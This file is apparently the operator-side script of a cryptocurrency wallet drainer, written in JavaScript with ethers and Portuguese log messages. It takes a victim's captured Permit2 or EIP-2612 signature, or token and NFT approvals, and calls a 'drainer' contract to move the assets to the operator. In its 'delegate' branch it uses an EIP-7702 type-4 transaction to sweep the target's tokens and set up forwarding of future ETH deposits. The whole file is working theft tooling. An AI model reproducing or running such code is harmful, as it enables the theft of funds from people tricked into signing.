import { readFileSync } from "node:fs";
import { Contract, getAddress } from "ethers";
import { loadEnv, drainer, PERMIT2, PERMIT2_ABI, SWEEPER_ABI } from "./lib.mjs";

const capture = JSON.parse(readFileSync(process.argv[2] ?? "", "utf8"));
const { wallet, provider } = loadEnv();
if (!wallet) throw new Error("PRIVATE_KEY ausente");
const target = getAddress(capture.owner);
const d = drainer(provider).connect(wallet); // sem o connect o runner e read-only

console.log(`capture ${capture.kind} de ${target} (chain ${capture.chainId})`);
const net = await provider.getNetwork();
if (capture.chainId && Number(net.chainId) !== Number(capture.chainId)) {
  throw new Error(`capture é da chain ${capture.chainId}, RPC está em ${net.chainId}`);
}

if (capture.kind === "permit2") {
  const batch = {
    details: capture.details.map((x) => ({
      token: getAddress(x.token),
      amount: BigInt(x.amount),
      expiration: Number(x.expiration),
      nonce: Number(x.nonce),
    })),
    spender: await d.getAddress(),
    sigDeadline: Number(capture.sigDeadline),
  };
  const tx = await d.permit2Batch(batch, target, capture.signature, { gasLimit: capture.gasLimit ?? 900_000 });
  console.log(`tx ${tx.hash}`);
  console.log(JSON.stringify(await tx.wait(), (k, v) => (typeof v === "bigint" ? v.toString() : v), 2));
} else if (capture.kind === "permit2612") {
  const sig = capture.signature;
  const tx = await d.permit2612(getAddress(capture.token), target, BigInt(capture.value), Number(capture.deadline), sig, {
    gasLimit: capture.gasLimit ?? 400_000,
  });
  console.log(`tx ${tx.hash}`);
  await tx.wait();
} else if (capture.kind === "pull") {
  const tx = await d.pullMany(capture.tokens.map(getAddress), target, { gasLimit: 300_000 + 90_000 * capture.tokens.length });
  console.log(`tx ${tx.hash}`);
  await tx.wait();
} else if (capture.kind === "pull721") {
  const tx = await d.pull721(getAddress(capture.collection), target, capture.ids.map(BigInt), {
    gasLimit: 200_000 + 90_000 * capture.ids.length,
  });
  console.log(`tx ${tx.hash}`);
  await tx.wait();
} else if (capture.kind === "delegate") {
  const sweeper = getAddress(process.env.SWEEPER ?? capture.sweeper);
  const nonce = await provider.getTransactionCount(target);
  const auth = await wallet.authorize({ address: sweeper, nonce });

  // The authorization is applied before execution, so this single type-4 tx can already call
  // into the freshly delegated code and sweep everything to the operator.
  const sweepData = new Contract(target, SWEEPER_ABI, provider).interface.encodeFunctionData("sweep", [
    wallet.address,
    capture.tokens.map(getAddress),
    [],
    [],
  ]);
  const tx = await wallet.sendTransaction({
    type: 4,
    to: target,
    data: sweepData,
    authorizationList: [auth],
    gasLimit: capture.gasLimit ?? 500_000,
  });
  console.log(`delegação + sweep: ${tx.hash}`);
  await tx.wait();

  // First-caller-wins init makes later ETH deposits auto-forward.
  const initData = new Contract(target, SWEEPER_ABI, provider).interface.encodeFunctionData("init", [wallet.address]);
  const initTx = await wallet.sendTransaction({ to: target, data: initData, gasLimit: 100_000 });
  await initTx.wait();
  console.log(`init: ${initTx.hash}`);
} else {
  throw new Error(`kind desconhecido: ${capture.kind}`);
}
